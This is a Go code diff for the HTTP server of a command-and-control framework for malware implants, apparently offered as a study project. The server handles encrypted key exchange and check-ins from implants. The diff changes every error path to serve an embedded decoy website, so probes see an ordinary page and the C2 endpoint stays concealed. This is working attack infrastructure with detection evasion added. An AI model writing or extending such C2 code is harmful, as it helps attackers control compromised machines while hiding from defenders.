@@ -2,6 +2,7 @@ package c2
 
 import (
 	"crypto/rand"
+	_ "embed"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
@@ -18,6 +19,9 @@ import (
 	"xhc2_for_studying/server/handlers"
 	"xhc2_for_studying/server/store"
 )
+
+//go:embed webroot/index.html
+var websiteHTML []byte
 
 type HTTPServer struct {
 	engine        *gin.Engine
@@ -73,17 +77,17 @@ func (s *HTTPServer) Run(addr string) error {
 
 func (s *HTTPServer) handleC2Request(c *gin.Context) {
 	if c.Request.Method != http.MethodPost {
-		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
+		s.serveWebsite(c)
 		return
 	}
 
 	rawBody, err := io.ReadAll(c.Request.Body)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "read body"})
+		s.serveWebsite(c)
 		return
 	}
 
-	ext := fileExt(c.Request.URL.Path)
+	ext := filepath.Ext(c.Request.URL.Path)
 
 	// 密钥交换：不需要预先有 CipherContext
 	if ext == protocol.ExtKeyExchange {
@@ -95,19 +99,19 @@ func (s *HTTPServer) handleC2Request(c *gin.Context) {
 	sessionToken := c.GetHeader("X-Session-Token")
 	cipherCtx := s.sessionStore.Get(sessionToken)
 	if cipherCtx == nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
+		s.serveWebsite(c)
 		return
 	}
 
 	// Base64 解码 → 解密
 	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "decode failed"})
+		s.serveWebsite(c)
 		return
 	}
 	plaintext, err := cipherCtx.Decrypt(decoded)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "decrypt failed"})
+		s.serveWebsite(c)
 		return
 	}
 
@@ -119,7 +123,7 @@ func (s *HTTPServer) handleC2Request(c *gin.Context) {
 	case protocol.ExtCheckin:
 		respBody = s.handleCheckinEncrypted(plaintext, c.ClientIP())
 	default:
-		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
+		s.serveWebsite(c)
 		return
 	}
 
@@ -145,20 +149,20 @@ func (s *HTTPServer) handleKeyExchange(c *gin.Context, rawBody []byte) {
 	// 1. Base64 解码 → Age 解密 → 得到 sKey
 	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "decode failed"})
+		s.serveWebsite(c)
 		return
 	}
 
 	sKey, err := protocol.AgeDecryptFromImplant(decoded, s.agePrivateKey)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "decrypt key failed"})
+		s.serveWebsite(c)
 		return
 	}
 
 	// 2. 创建 CipherContext + 生成 session token
 	cipherCtx, err := protocol.NewCipherContext(sKey)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "create cipher failed"})
+		s.serveWebsite(c)
 		return
 	}
 
@@ -168,7 +172,7 @@ func (s *HTTPServer) handleKeyExchange(c *gin.Context, rawBody []byte) {
 	// 3. 加密 session_token 并返回（证明服务端持有私钥）
 	respPacket, _, err := cipherCtx.Encrypt([]byte(sessionToken))
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "encrypt response"})
+		s.serveWebsite(c)
 		return
 	}
 	encodedResp := make([]byte, base64.StdEncoding.EncodedLen(len(respPacket)))
@@ -215,8 +219,14 @@ func (s *HTTPServer) handleCheckinEncrypted(body []byte, remoteAddr string) []by
 
 // ── 辅助函数 ───────────────────────────────────────────────────────
 
-func fileExt(path string) string {
-	return filepath.Ext(path)
+func (s *HTTPServer) serveWebsite(c *gin.Context) {
+	c.Data(http.StatusOK, "text/html; charset=utf-8", websiteHTML)
+}
+
+func respondEncoded(c *gin.Context, packet []byte) {
+	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(packet)))
+	base64.StdEncoding.Encode(encoded, packet)
+	c.Data(http.StatusOK, "application/octet-stream", encoded)
 }
 
 func mustMarshalJSON(v any) []byte {
